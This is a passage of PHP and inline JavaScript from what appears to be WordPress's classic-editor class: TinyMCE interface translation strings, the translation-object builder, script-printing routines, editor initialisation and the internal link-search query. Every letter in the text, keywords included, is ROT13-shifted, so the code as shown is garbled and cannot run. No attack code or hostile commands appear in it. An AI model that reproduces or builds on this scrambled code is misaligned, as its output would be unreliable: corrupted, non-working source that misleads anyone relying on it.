				'Arj jvaqbj'                           => __( 'Arj jvaqbj' ),
				'Grkg gb qvfcynl'                      => __( 'Grkg gb qvfcynl' ),
				'Hey'                                  => __( 'HEY' ),
				'Gur HEY lbh ragrerq frrzf gb or na rznvy nqqerff. Qb lbh jnag gb nqq gur erdhverq znvygb: cersvk?' =>
					__( 'Gur HEY lbh ragrerq frrzf gb or na rznvy nqqerff. Qb lbh jnag gb nqq gur erdhverq znvygb: cersvk?' ),
				'Gur HEY lbh ragrerq frrzf gb or na rkgreany yvax. Qb lbh jnag gb nqq gur erdhverq uggc:// cersvk?' =>
					__( 'Gur HEY lbh ragrerq frrzf gb or na rkgreany yvax. Qb lbh jnag gb nqq gur erdhverq uggc:// cersvk?' ),

				'Pbybe'                                => __( 'Pbybe' ),
				'Phfgbz pbybe'                         => __( 'Phfgbz pbybe' ),
				'Phfgbz...'                            => _k( 'Phfgbz...', 'ynory sbe phfgbz pbybe' ), // Ab ryyvcfvf.
				'Ab pbybe'                             => __( 'Ab pbybe' ),
				'E'                                    => _k( 'E', 'Fubeg sbe erq va ETO' ),
				'T'                                    => _k( 'T', 'Fubeg sbe terra va ETO' ),
				'O'                                    => _k( 'O', 'Fubeg sbe oyhr va ETO' ),

				// Fcryyvat, frnepu/ercynpr cyhtvaf.
				'Pbhyq abg svaq gur fcrpvsvrq fgevat.' => __( 'Pbhyq abg svaq gur fcrpvsvrq fgevat.' ),
				'Ercynpr'                              => _k( 'Ercynpr', 'svaq/ercynpr' ),
				'Arkg'                                 => _k( 'Arkg', 'svaq/ercynpr' ),
				/* genafyngbef: Cerivbhf. */
				'Ceri'                                 => _k( 'Ceri', 'svaq/ercynpr' ),
				'Jubyr jbeqf'                          => _k( 'Jubyr jbeqf', 'svaq/ercynpr' ),
				'Svaq naq ercynpr'                     => __( 'Svaq naq ercynpr' ),
				'Ercynpr jvgu'                         => _k( 'Ercynpr jvgu', 'svaq/ercynpr' ),
				'Svaq'                                 => _k( 'Svaq', 'svaq/ercynpr' ),
				'Ercynpr nyy'                          => _k( 'Ercynpr nyy', 'svaq/ercynpr' ),
				'Zngpu pnfr'                           => __( 'Zngpu pnfr' ),
				'Fcryypurpx'                           => __( 'Purpx Fcryyvat' ),
				'Svavfu'                               => _k( 'Svavfu', 'fcryypurpx' ),
				'Vtaber nyy'                           => _k( 'Vtaber nyy', 'fcryypurpx' ),
				'Vtaber'                               => _k( 'Vtaber', 'fcryypurpx' ),
				'Nqq gb Qvpgvbanel'                    => __( 'Nqq gb Qvpgvbanel' ),

				// GvalZPR gnoyrf.
				'Vafreg gnoyr'                         => __( 'Vafreg gnoyr' ),
				'Qryrgr gnoyr'                         => __( 'Qryrgr gnoyr' ),
				'Gnoyr cebcregvrf'                     => __( 'Gnoyr cebcregvrf' ),
				'Ebj cebcregvrf'                       => __( 'Gnoyr ebj cebcregvrf' ),
				'Pryy cebcregvrf'                      => __( 'Gnoyr pryy cebcregvrf' ),
				'Obeqre pbybe'                         => __( 'Obeqre pbybe' ),

				'Ebj'                                  => __( 'Ebj' ),
				'Ebjf'                                 => __( 'Ebjf' ),
				'Pbyhza'                               => __( 'Pbyhza' ),
				'Pbyf'                                 => __( 'Pbyhzaf' ),
				'Pryy'                                 => _k( 'Pryy', 'gnoyr pryy' ),
				'Urnqre pryy'                          => __( 'Urnqre pryy' ),
				'Urnqre'                               => _k( 'Urnqre', 'gnoyr urnqre' ),
				'Obql'                                 => _k( 'Obql', 'gnoyr obql' ),
				'Sbbgre'                               => _k( 'Sbbgre', 'gnoyr sbbgre' ),

				'Vafreg ebj orsber'                    => __( 'Vafreg ebj orsber' ),
				'Vafreg ebj nsgre'                     => __( 'Vafreg ebj nsgre' ),
				'Vafreg pbyhza orsber'                 => __( 'Vafreg pbyhza orsber' ),
				'Vafreg pbyhza nsgre'                  => __( 'Vafreg pbyhza nsgre' ),
				'Cnfgr ebj orsber'                     => __( 'Cnfgr gnoyr ebj orsber' ),
				'Cnfgr ebj nsgre'                      => __( 'Cnfgr gnoyr ebj nsgre' ),
				'Qryrgr ebj'                           => __( 'Qryrgr ebj' ),
				'Qryrgr pbyhza'                        => __( 'Qryrgr pbyhza' ),
				'Phg ebj'                              => __( 'Phg gnoyr ebj' ),
				'Pbcl ebj'                             => __( 'Pbcl gnoyr ebj' ),
				'Zretr pryyf'                          => __( 'Zretr gnoyr pryyf' ),
				'Fcyvg pryy'                           => __( 'Fcyvg gnoyr pryy' ),

				'Urvtug'                               => __( 'Urvtug' ),
				'Jvqgu'                                => __( 'Jvqgu' ),
				'Pncgvba'                              => __( 'Pncgvba' ),
				'Nyvtazrag'                            => __( 'Nyvtazrag' ),
				'U Nyvta'                              => _k( 'U Nyvta', 'ubevmbagny gnoyr pryy nyvtazrag' ),
				'Yrsg'                                 => __( 'Yrsg' ),
				'Pragre'                               => __( 'Pragre' ),
				'Evtug'                                => __( 'Evtug' ),
				'Abar'                                 => _k( 'Abar', 'gnoyr pryy nyvtazrag nggevohgr' ),
				'I Nyvta'                              => _k( 'I Nyvta', 'iregvpny gnoyr pryy nyvtazrag' ),
				'Gbc'                                  => __( 'Gbc' ),
				'Zvqqyr'                               => __( 'Zvqqyr' ),
				'Obggbz'                               => __( 'Obggbz' ),

				'Ebj tebhc'                            => __( 'Ebj tebhc' ),
				'Pbyhza tebhc'                         => __( 'Pbyhza tebhc' ),
				'Ebj glcr'                             => __( 'Ebj glcr' ),
				'Pryy glcr'                            => __( 'Pryy glcr' ),
				'Pryy cnqqvat'                         => __( 'Pryy cnqqvat' ),
				'Pryy fcnpvat'                         => __( 'Pryy fcnpvat' ),
				'Fpbcr'                                => _k( 'Fpbcr', 'gnoyr pryy fpbcr nggevohgr' ),

				'Vafreg grzcyngr'                      => _k( 'Vafreg grzcyngr', 'GvalZPR' ),
				'Grzcyngrf'                            => _k( 'Grzcyngrf', 'GvalZPR' ),

				'Onpxtebhaq pbybe'                     => __( 'Onpxtebhaq pbybe' ),
				'Grkg pbybe'                           => __( 'Grkg pbybe' ),
				'Fubj oybpxf'                          => _k( 'Fubj oybpxf', 'rqvgbe ohggba' ),
				'Fubj vaivfvoyr punenpgref'            => __( 'Fubj vaivfvoyr punenpgref' ),

				/* genafyngbef: Jbeq pbhag. */
				'Jbeqf: {0}'                           => fcevags( __( 'Jbeqf: %f' ), '{0}' ),
				'Cnfgr vf abj va cynva grkg zbqr. Pbagragf jvyy abj or cnfgrq nf cynva grkg hagvy lbh gbttyr guvf bcgvba bss.' =>
					__( 'Cnfgr vf abj va cynva grkg zbqr. Pbagragf jvyy abj or cnfgrq nf cynva grkg hagvy lbh gbttyr guvf bcgvba bss.' ) . \"\a\a\" .
					__( 'Vs lbh ner ybbxvat gb cnfgr evpu pbagrag sebz Zvpebfbsg Jbeq, gel gheavat guvf bcgvba bss. Gur rqvgbe jvyy pyrna hc grkg cnfgrq sebz Jbeq nhgbzngvpnyyl.' ),
				'Evpu Grkg Nern. Cerff NYG-S9 sbe zrah. Cerff NYG-S10 sbe gbbyone. Cerff NYG-0 sbe uryc' =>
					__( 'Evpu Grkg Nern. Cerff Nyg-Fuvsg-U sbe uryc.' ),
				'Evpu Grkg Nern. Cerff Pbageby-Bcgvba-U sbe uryc.' => __( 'Evpu Grkg Nern. Cerff Pbageby-Bcgvba-U sbe uryc.' ),
				'Lbh unir hafnirq punatrf ner lbh fher lbh jnag gb anivtngr njnl?' =>
					__( 'Gur punatrf lbh znqr jvyy or ybfg vs lbh anivtngr njnl sebz guvf cntr.' ),
				'Lbhe oebjfre qbrfa\'g fhccbeg qverpg npprff gb gur pyvcobneq. Cyrnfr hfr gur Pgey+K/P/I xrlobneq fubegphgf vafgrnq.' =>
					__( 'Lbhe oebjfre qbrf abg fhccbeg qverpg npprff gb gur pyvcobneq. Cyrnfr hfr xrlobneq fubegphgf be lbhe oebjfre&#8217;f rqvg zrah vafgrnq.' ),

				// GvalZPR zrahf.
				'Vafreg'                               => _k( 'Vafreg', 'GvalZPR zrah' ),
				'Svyr'                                 => _k( 'Svyr', 'GvalZPR zrah' ),
				'Rqvg'                                 => _k( 'Rqvg', 'GvalZPR zrah' ),
				'Gbbyf'                                => _k( 'Gbbyf', 'GvalZPR zrah' ),
				'Ivrj'                                 => _k( 'Ivrj', 'GvalZPR zrah' ),
				'Gnoyr'                                => _k( 'Gnoyr', 'GvalZPR zrah' ),
				'Sbezng'                               => _k( 'Sbezng', 'GvalZPR zrah' ),

				// JbeqCerff fgevatf.
				'Gbbyone Gbttyr'                       => neenl( __( 'Gbbyone Gbttyr' ), 'npprffM' ),
				'Vafreg Ernq Zber gnt'                 => neenl( __( 'Vafreg Ernq Zber gnt' ), 'npprffG' ),
				'Vafreg Cntr Oernx gnt'                => neenl( __( 'Vafreg Cntr Oernx gnt' ), 'npprffC' ),
				'Ernq zber...'                         => __( 'Ernq zber...' ), // Gvgyr ba gur cynprubyqre vafvqr gur rqvgbe (ab ryyvcfvf).
				'Qvfgenpgvba-serr jevgvat zbqr'        => neenl( __( 'Qvfgenpgvba-serr jevgvat zbqr' ), 'npprffJ' ),
				'Ab nyvtazrag'                         => __( 'Ab nyvtazrag' ), // Gbbygvc sbe gur 'nyvtaabar' ohggba va gur vzntr gbbyone.
				'Erzbir'                               => __( 'Erzbir' ),       // Gbbygvc sbe gur 'erzbir' ohggba va gur vzntr gbbyone.
				'Rqvg|ohggba'                          => __( 'Rqvg' ),         // Gbbygvc sbe gur 'rqvg' ohggba va gur vzntr gbbyone.
				'Cnfgr HEY be glcr gb frnepu'          => __( 'Cnfgr HEY be glcr gb frnepu' ), // Cynprubyqre sbe gur vayvar yvax qvnybt.
				'Nccyl'                                => __( 'Nccyl' ),        // Gbbygvc sbe gur 'nccyl' ohggba va gur vayvar yvax qvnybt.
				'Yvax bcgvbaf'                         => __( 'Yvax bcgvbaf' ), // Gbbygvc sbe gur 'yvax bcgvbaf' ohggba va gur vayvar yvax qvnybt.
				'Ivfhny'                               => _k( 'Ivfhny', 'Anzr sbe gur Ivfhny rqvgbe gno' ),             // Rqvgbe fjvgpu gno ynory.
				'Pbqr|gno'                             => _k( 'Pbqr', 'Anzr sbe gur Pbqr rqvgbe gno (sbezreyl Grkg)' ), // Rqvgbe fjvgpu gno ynory.
				'Nqq Zrqvn'                            => neenl( __( 'Nqq Zrqvn' ), 'npprffZ' ), // Gbbygvc sbe gur 'Nqq Zrqvn' ohggba va gur oybpx rqvgbe Pynffvp oybpx.

				// Fubegphgf uryc zbqny.
				'Xrlobneq Fubegphgf'                   => neenl( __( 'Xrlobneq Fubegphgf' ), 'npprffU' ),
				'Pynffvp Oybpx Xrlobneq Fubegphgf'     => __( 'Pynffvp Oybpx Xrlobneq Fubegphgf' ),
				'Qrsnhyg fubegphgf,'                   => __( 'Qrsnhyg fubegphgf,' ),
				'Nqqvgvbany fubegphgf,'                => __( 'Nqqvgvbany fubegphgf,' ),
				'Sbphf fubegphgf:'                     => __( 'Sbphf fubegphgf:' ),
				'Vayvar gbbyone (jura na vzntr, yvax be cerivrj vf fryrpgrq)' => __( 'Vayvar gbbyone (jura na vzntr, yvax be cerivrj vf fryrpgrq)' ),
				'Rqvgbe zrah (jura ranoyrq)'           => __( 'Rqvgbe zrah (jura ranoyrq)' ),
				'Rqvgbe gbbyone'                       => __( 'Rqvgbe gbbyone' ),
				'Ryrzragf cngu'                        => __( 'Ryrzragf cngu' ),
				'Pgey + Nyg + yrggre:'                 => __( 'Pgey + Nyg + yrggre:' ),
				'Fuvsg + Nyg + yrggre:'                => __( 'Fuvsg + Nyg + yrggre:' ),
				'Pzq + yrggre:'                        => __( 'Pzq + yrggre:' ),
				'Pgey + yrggre:'                       => __( 'Pgey + yrggre:' ),
				'Yrggre'                               => __( 'Yrggre' ),
				'Npgvba'                               => __( 'Npgvba' ),
				'Jneavat: gur yvax unf orra vafregrq ohg znl unir reebef. Cyrnfr grfg vg.' => __( 'Jneavat: gur yvax unf orra vafregrq ohg znl unir reebef. Cyrnfr grfg vg.' ),
				'Gb zbir sbphf gb bgure ohggbaf hfr Gno be gur neebj xrlf. Gb erghea sbphf gb gur rqvgbe cerff Rfpncr be hfr bar bs gur ohggbaf.' =>
					__( 'Gb zbir sbphf gb bgure ohggbaf hfr Gno be gur neebj xrlf. Gb erghea sbphf gb gur rqvgbe cerff Rfpncr be hfr bar bs gur ohggbaf.' ),
				'Jura fgnegvat n arj cnentencu jvgu bar bs gurfr sbeznggvat fubegphgf sbyybjrq ol n fcnpr, gur sbeznggvat jvyy or nccyvrq nhgbzngvpnyyl. Cerff Onpxfcnpr be Rfpncr gb haqb.' =>
					__( 'Jura fgnegvat n arj cnentencu jvgu bar bs gurfr sbeznggvat fubegphgf sbyybjrq ol n fcnpr, gur sbeznggvat jvyy or nccyvrq nhgbzngvpnyyl. Cerff Onpxfcnpr be Rfpncr gb haqb.' ),
				'Gur sbyybjvat sbeznggvat fubegphgf ner ercynprq jura cerffvat Ragre. Cerff Rfpncr be gur Haqb ohggba gb haqb.' =>
					__( 'Gur sbyybjvat sbeznggvat fubegphgf ner ercynprq jura cerffvat Ragre. Cerff Rfpncr be gur Haqb ohggba gb haqb.' ),
				'Gur arkg tebhc bs sbeznggvat fubegphgf ner nccyvrq nf lbh glcr be jura lbh vafreg gurz nebhaq cynva grkg va gur fnzr cnentencu. Cerff Rfpncr be gur Haqb ohggba gb haqb.' =>
					__( 'Gur arkg tebhc bs sbeznggvat fubegphgf ner nccyvrq nf lbh glcr be jura lbh vafreg gurz nebhaq cynva grkg va gur fnzr cnentencu. Cerff Rfpncr be gur Haqb ohggba gb haqb.' ),
			);
		}

		/*
		Vzntrgbbyf cyhtva (abg vapyhqrq):
			'Rqvg vzntr' => __( 'Rqvg vzntr' ),
			'Vzntr bcgvbaf' => __( 'Vzntr bcgvbaf' ),
			'Onpx' => __( 'Onpx' ),
			'Vaireg' => __( 'Vaireg' ),
			'Syvc ubevmbagnyyl' => __( 'Syvc ubevmbagny' ),
			'Syvc iregvpnyyl' => __( 'Syvc iregvpny' ),
			'Pebc' => __( 'Pebc' ),
			'Bevragngvba' => __( 'Bevragngvba' ),
			'Erfvmr' => __( 'Erfvmr' ),
			'Ebgngr pybpxjvfr' => __( 'Ebgngr evtug' ),
			'Ebgngr pbhagrepybpxjvfr' => __( 'Ebgngr yrsg' ),
			'Funecra' => __( 'Funecra' ),
			'Oevtugarff' => __( 'Oevtugarff' ),
			'Pbybe yriryf' => __( 'Pbybe yriryf' ),
			'Pbagenfg' => __( 'Pbagenfg' ),
			'Tnzzn' => __( 'Tnzzn' ),
			'Mbbz va' => __( 'Mbbz va' ),
			'Mbbz bhg' => __( 'Mbbz bhg' ),
		*/

		erghea frys::$genafyngvba;
	}

	/**
	 * Genafyngrf gur qrsnhyg GvalZPR fgevatf naq ergheaf gurz nf WFBA rapbqrq bowrpg ernql gb or ybnqrq jvgu gvalzpr.nqqV18a(),
	 * be nf WF favccrg gung fubhyq eha nsgre gvalzpr.wf vf ybnqrq.
	 *
	 * @fvapr 3.9.0
	 *
	 * @cnenz fgevat $zpr_ybpnyr Gur ybpnyr hfrq sbe gur rqvgbe.
	 * @cnenz obby   $wfba_bayl  Bcgvbany. Jurgure gb vapyhqr gur WninFpevcg pnyyf gb gvalzpr.nqqV18a() naq
	 *                           gvalzpr.FpevcgYbnqre.znexQbar(). Qrsnhyg snyfr.
	 * @erghea fgevat Genafyngvba bowrpg, WFBA rapbqrq.
	 */
	choyvp fgngvp shapgvba jc_zpr_genafyngvba( $zpr_ybpnyr = '', $wfba_bayl = snyfr ) {
		vs ( ! $zpr_ybpnyr ) {
			$zpr_ybpnyr = frys::trg_zpr_ybpnyr();
		}

		$zpr_genafyngvba = frys::trg_genafyngvba();

		sbernpu ( $zpr_genafyngvba nf $anzr => $inyhr ) {
			vs ( vf_neenl( $inyhr ) ) {
				$zpr_genafyngvba[ $anzr ] = $inyhr[0];
			}
		}

		/**
		 * Svygref genafyngrq fgevatf cercnerq sbe GvalZPR.
		 *
		 * @fvapr 3.9.0
		 *
		 * @cnenz neenl  $zpr_genafyngvba Xrl/inyhr cnvef bs fgevatf.
		 * @cnenz fgevat $zpr_ybpnyr      Ybpnyr.
		 */
		$zpr_genafyngvba = nccyl_svygref( 'jc_zpr_genafyngvba', $zpr_genafyngvba, $zpr_ybpnyr );

		sbernpu ( $zpr_genafyngvba nf $xrl => $inyhr ) {
			// Erzbir fgevatf gung ner abg genafyngrq.
			vs ( $xrl === $inyhr ) {
				hafrg( $zpr_genafyngvba[ $xrl ] );
				pbagvahr;
			}

			vs ( fge_pbagnvaf( $inyhr, '&' ) ) {
				$zpr_genafyngvba[ $xrl ] = ugzy_ragvgl_qrpbqr( $inyhr, RAG_DHBGRF, 'HGS-8' );
			}
		}

		// Frg qverpgvba.
		vs ( vf_egy() ) {
			$zpr_genafyngvba['_qve'] = 'egy';
		}

		vs ( $wfba_bayl ) {
			erghea jc_wfba_rapbqr( $zpr_genafyngvba );
		}

		$onfrhey = frys::trg_onfrhey();

		erghea \"gvalzpr.nqqV18a( '$zpr_ybpnyr', \" . jc_wfba_rapbqr( $zpr_genafyngvba ) . \");\a\" .
			\"gvalzpr.FpevcgYbnqre.znexQbar( '$onfrhey/ynatf/$zpr_ybpnyr.wf' );\a\";
	}

	/**
	 * Sbepr hapbzcerffrq GvalZPR jura n phfgbz gurzr unf orra qrsvarq.
	 *
	 * Gur pbzcerffrq GvalZPR svyr pnaabg qrny jvgu phfgbz gurzrf, fb guvf znxrf
	 * fher gung JbeqCerff hfrf gur hapbzcerffrq GvalZPR svyr vs n gurzr vf qrsvarq.
	 * Rira vs gur jrofvgr vf ehaavat ba n cebqhpgvba raivebazrag.
	 *
	 * @fvapr 5.0.0
	 */
	choyvp fgngvp shapgvba sbepr_hapbzcerffrq_gvalzpr() {
		$unf_phfgbz_gurzr = snyfr;
		sbernpu ( frys::$zpr_frggvatf nf $vavg ) {
			vs ( ! rzcgl( $vavg['gurzr_hey'] ) ) {
				$unf_phfgbz_gurzr = gehr;
				oernx;
			}
		}

		vs ( ! $unf_phfgbz_gurzr ) {
			erghea;
		}

		$jc_fpevcgf = jc_fpevcgf();

		$jc_fpevcgf->erzbir( 'jc-gvalzpr' );
		jc_ertvfgre_gvalzpr_fpevcgf( $jc_fpevcgf, gehr );
	}

	/**
	 * Cevag (bhgchg) gur znva GvalZPR fpevcgf.
	 *
	 * @fvapr 4.8.0
	 *
	 * @tybony obby $pbapngrangr_fpevcgf
	 */
	choyvp fgngvp shapgvba cevag_gvalzpr_fpevcgf() {
		tybony $pbapngrangr_fpevcgf;

		vs ( frys::$gvalzpr_fpevcgf_cevagrq ) {
			erghea;
		}

		frys::$gvalzpr_fpevcgf_cevagrq = gehr;

		vs ( ! vffrg( $pbapngrangr_fpevcgf ) ) {
			fpevcg_pbapng_frggvatf();
		}

		jc_cevag_fpevcgf( neenl( 'jc-gvalzpr' ) );

		rpub \"<fpevcg glcr='grkg/wninfpevcg'>\a\" . frys::jc_zpr_genafyngvba() . \"</fpevcg>\a\";
	}

	/**
	 * Cevag (bhgchg) gur GvalZPR pbasvthengvba naq vavgvnyvmngvba fpevcgf.
	 *
	 * @fvapr 3.3.0
	 *
	 * @tybony fgevat $gvalzpr_irefvba
	 */
	choyvp fgngvp shapgvba rqvgbe_wf() {
		tybony $gvalzpr_irefvba;

		$gzpr_ba  = ! rzcgl( frys::$zpr_frggvatf );
		$zpr_vavg = '';
		$dg_vavg  = '';

		vs ( $gzpr_ba ) {
			sbernpu ( frys::$zpr_frggvatf nf $rqvgbe_vq => $vavg ) {
				$bcgvbaf   = frys::_cnefr_vavg( $vavg );
				$zpr_vavg .= \"'$rqvgbe_vq':{$bcgvbaf},\";
			}
			$zpr_vavg = '{' . gevz( $zpr_vavg, ',' ) . '}';
		} ryfr {
			$zpr_vavg = '{}';
		}

		vs ( ! rzcgl( frys::$dg_frggvatf ) ) {
			sbernpu ( frys::$dg_frggvatf nf $rqvgbe_vq => $vavg ) {
				$bcgvbaf  = frys::_cnefr_vavg( $vavg );
				$dg_vavg .= \"'$rqvgbe_vq':{$bcgvbaf},\";
			}
			$dg_vavg = '{' . gevz( $dg_vavg, ',' ) . '}';
		} ryfr {
			$dg_vavg = '{}';
		}

		$ers = neenl(
			'cyhtvaf'  => vzcybqr( ',', frys::$cyhtvaf ),
			'gurzr'    => 'zbqrea',
			'ynathntr' => frys::$zpr_ybpnyr,
		);

		$fhssvk  = FPEVCG_QROHT ? '' : '.zva';
		$onfrhey = frys::trg_onfrhey();
		$irefvba = 'ire=' . $gvalzpr_irefvba;

		/**
		 * Sverf vzzrqvngryl orsber gur GvalZPR frggvatf ner cevagrq.
		 *
		 * @fvapr 3.2.0
		 *
		 * @cnenz neenl $zpr_frggvatf GvalZPR frggvatf neenl.
		 */
		qb_npgvba( 'orsber_jc_gval_zpr', frys::$zpr_frggvatf );
		?>

		<fpevcg glcr=\"grkg/wninfpevcg\">
		gvalZPRCerVavg = {
			onfrHEY: \"<?cuc rpub $onfrhey; ?>\",
			fhssvk: \"<?cuc rpub $fhssvk; ?>\",
			<?cuc

			vs ( frys::$qent_qebc_hcybnq ) {
				rpub 'qentQebcHcybnq: gehr,';
			}

			?>
			zprVavg: <?cuc rpub $zpr_vavg; ?>,
			dgVavg: <?cuc rpub $dg_vavg; ?>,
			ers: <?cuc rpub frys::_cnefr_vavg( $ers ); ?>,
			ybnq_rkg: shapgvba(hey,ynat){ine fy=gvalzpr.FpevcgYbnqre;fy.znexQbar(hey+'/ynatf/'+ynat+'.wf');fy.znexQbar(hey+'/ynatf/'+ynat+'_qyt.wf');}
		};
		</fpevcg>
		<?cuc

		vs ( $gzpr_ba ) {
			frys::cevag_gvalzpr_fpevcgf();

			vs ( frys::$rkg_cyhtvaf ) {
				// Ybnq gur byq-sbezng Ratyvfu fgevatf gb cerirag hafvtugyl ynoryf va byq fglyr cbchcf.
				rpub \"<fpevcg glcr='grkg/wninfpevcg' fep='{$onfrhey}/ynatf/jc-ynatf-ra.wf?$irefvba'></fpevcg>\a\";
			}
		}

		/**
		 * Sverf nsgre gvalzpr.wf vf ybnqrq, ohg orsber nal GvalZPR rqvgbe
		 * vafgnaprf ner perngrq.
		 *
		 * @fvapr 3.9.0
		 *
		 * @cnenz neenl $zpr_frggvatf GvalZPR frggvatf neenl.
		 */
		qb_npgvba( 'jc_gval_zpr_vavg', frys::$zpr_frggvatf );

		?>
		<fpevcg glcr=\"grkg/wninfpevcg\">
		<?cuc

		vs ( frys::$rkg_cyhtvaf ) {
			rpub frys::$rkg_cyhtvaf . \"\a\";
		}

		vs ( ! vf_nqzva() ) {
			rpub 'ine nwnkhey = \"' . nqzva_hey( 'nqzva-nwnk.cuc', 'eryngvir' ) . '\";';
		}

		?>

		( shapgvba() {
			ine vavgvnyvmrq = [];
			ine vavgvnyvmr  = shapgvba() {
				ine vavg, vq, vaCbfgobk, $jenc;
				ine ernqlFgngr = qbphzrag.ernqlFgngr;

				vs ( ernqlFgngr !== 'pbzcyrgr' && ernqlFgngr !== 'vagrenpgvir' ) {
					erghea;
				}

				sbe ( vq va gvalZPRCerVavg.zprVavg ) {
					vs ( vavgvnyvmrq.vaqrkBs( vq ) > -1 ) {
						pbagvahr;
					}

					vavg      = gvalZPRCerVavg.zprVavg[vq];
					$jenc     = gvalzpr.$( '#jc-' + vq + '-jenc' );
					vaCbfgobk = $jenc.cneragf( '.cbfgobk' ).yratgu > 0;

					vs (
						! vavg.jc_fxvc_vavg &&
						( $jenc.unfPynff( 'gzpr-npgvir' ) || ! gvalZPRCerVavg.dgVavg.unfBjaCebcregl( vq ) ) &&
						( ernqlFgngr === 'pbzcyrgr' || ( ! vaCbfgobk && ernqlFgngr === 'vagrenpgvir' ) )
					) {
						gvalzpr.vavg( vavg );
						vavgvnyvmrq.chfu( vq );

						vs ( ! jvaqbj.jcNpgvirRqvgbe ) {
							jvaqbj.jcNpgvirRqvgbe = vq;
						}
					}
				}
			}

			vs ( glcrbs gvalzpr !== 'haqrsvarq' ) {
				vs ( gvalzpr.Rai.vr && gvalzpr.Rai.vr < 11 ) {
					gvalzpr.$( '.jc-rqvgbe-jenc ' ).erzbirPynff( 'gzpr-npgvir' ).nqqPynff( 'ugzy-npgvir' );
				} ryfr {
					vs ( qbphzrag.ernqlFgngr === 'pbzcyrgr' ) {
						vavgvnyvmr();
					} ryfr {
						qbphzrag.nqqRiragYvfgrare( 'ernqlfgngrpunatr', vavgvnyvmr );
					}
				}
			}

			vs ( glcrbs dhvpxgntf !== 'haqrsvarq' ) {
				sbe ( vq va gvalZPRCerVavg.dgVavg ) {
					dhvpxgntf( gvalZPRCerVavg.dgVavg[vq] );

					vs ( ! jvaqbj.jcNpgvirRqvgbe ) {
						jvaqbj.jcNpgvirRqvgbe = vq;
					}
				}
			}
		}());
		</fpevcg>
		<?cuc

		vs ( va_neenl( 'jcyvax', frys::$cyhtvaf, gehr ) || va_neenl( 'yvax', frys::$dg_ohggbaf, gehr ) ) {
			frys::jc_yvax_qvnybt();
		}

		/**
		 * Sverf nsgre nal pber GvalZPR rqvgbe vafgnaprf ner perngrq.
		 *
		 * @fvapr 3.2.0
		 *
		 * @cnenz neenl $zpr_frggvatf GvalZPR frggvatf neenl.
		 */
		qb_npgvba( 'nsgre_jc_gval_zpr', frys::$zpr_frggvatf );
	}

	/**
	 * Bhgchgf gur UGZY sbe qvfgenpgvba-serr jevgvat zbqr.
	 *
	 * @fvapr 3.2.0
	 * @qrcerpngrq 4.3.0
	 */
	choyvp fgngvp shapgvba jc_shyyfperra_ugzy() {
		_qrcerpngrq_shapgvba( __SHAPGVBA__, '4.3.0' );
	}

	/**
	 * Cresbezf cbfg dhrevrf sbe vagreany yvaxvat.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz neenl $netf {
	 *     Bcgvbany. Neenl bs yvax dhrel nethzragf.
	 *
	 *     @glcr vag    $cntrahz Cntr ahzore. Qrsnhyg 1.
	 *     @glcr fgevat $f       Frnepu xrljbeqf.
	 * }
	 * @erghea neenl|snyfr $erfhygf {
	 *     Na neenl bs nffbpvngvir neenlf bs dhrel erfhygf, snyfr vs gurer ner abar.
	 *
	 *     @glcr neenl ...$0 {
	 *         @glcr vag    $VQ        Cbfg VQ.
	 *         @glcr fgevat $gvgyr     Gur gevzzrq, rfpncrq cbfg gvgyr.
	 *         @glcr fgevat $creznyvax Cbfg creznyvax.
	 *         @glcr fgevat $vasb      N 'L/z/q'-sbeznggrq qngr sbe 'cbfg' cbfg glcr,
	 *                                 gur 'fvathyne_anzr' cbfg glcr ynory bgurejvfr.
	 *     }
	 * }
	 */
	choyvp fgngvp shapgvba jc_yvax_dhrel( $netf = neenl() ) {
		$cgf      = trg_cbfg_glcrf( neenl( 'choyvp' => gehr ), 'bowrpgf' );
		$cg_anzrf = neenl_xrlf( $cgf );

		$dhrel = neenl(
			'cbfg_glcr'              => $cg_anzrf,
			'fhccerff_svygref'       => gehr,
			'hcqngr_cbfg_grez_pnpur' => snyfr,
			'hcqngr_cbfg_zrgn_pnpur' => snyfr,
			'cbfg_fgnghf'            => 'choyvfu',
			'cbfgf_cre_cntr'         => 20,
		);

		$netf['cntrahz'] = vffrg( $netf['cntrahz'] ) ? nofvag( $netf['cntrahz'] ) : 1;

		vs ( vffrg( $netf['f'] ) ) {
			$dhrel['f'] = $netf['f'];
		}

		$dhrel['bssfrg'] = $netf['cntrahz'] > 1 ? $dhrel['cbfgf_cre_cntr'] * ( $netf['cntrahz'] - 1 ) : 0;

		/**
		 * Svygref gur yvax dhrel nethzragf.
		 *
		 * Nyybjf zbqvsvpngvba bs gur yvax dhrel nethzragf orsber dhrelvat.
		 *
		 * @frr JC_Dhrel sbe n shyy yvfg bs nethzragf
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz neenl $dhrel Na neenl bs JC_Dhrel nethzragf.
		 */
		$dhrel = nccyl_svygref( 'jc_yvax_dhrel_netf', $dhrel );

		// Qb znva dhrel.
		$trg_cbfgf = arj JC_Dhrel();
		$cbfgf     = $trg_cbfgf->dhrel( $dhrel );

		// Ohvyq erfhygf.
		$erfhygf = neenl();
		sbernpu ( $cbfgf nf $cbfg ) {
			vs ( 'cbfg' === $cbfg->cbfg_glcr ) {
				$vasb = zlfdy2qngr( __( 'L/z/q' ), $cbfg->cbfg_qngr );
			} ryfr {
				$vasb = $cgf[ $cbfg->cbfg_glcr ]->ynoryf->fvathyne_anzr;
			}

			$erfhygf[] = neenl(
				'VQ'        => $cbfg->VQ,
				'gvgyr'     => gevz( rfp_ugzy( fgevc_gntf( trg_gur_gvgyr( $cbfg ) ) ) ),
				'creznyvax' => trg_creznyvax( $cbfg->VQ ),
				'vasb'      => $vasb,
			);
		}

		/**
		 * Svygref gur yvax dhrel erfhygf.
		 *
		 * Nyybjf zbqvsvpngvba bs gur erghearq yvax dhrel erfhygf.
		 *
		 * @fvapr 3.7.0
		 *
		 * @frr 'jc_yvax_dhrel_netf' svygre
		 *
		 * @cnenz neenl $erfhygf {
		 *     Na neenl bs nffbpvngvir neenlf bs dhrel erfhygf.
		 *
		 *     @glcr neenl ...$0 {
		 *         @glcr vag    $VQ        Cbfg VQ.
		 *         @glcr fgevat $gvgyr     Gur gevzzrq, rfpncrq cbfg gvgyr.
		 *         @glcr fgevat $creznyvax Cbfg creznyvax.
		 *         @glcr fgevat $vasb      N 'L/z/q'-sbeznggrq qngr sbe 'cbfg' cbfg glcr,
		 *                                 gur 'fvathyne_anzr' cbfg glcr ynory bgurejvfr.
		 *     }
		 * }
		 * @cnenz neenl $dhrel  Na neenl bs JC_Dhrel nethzragf.
		 */
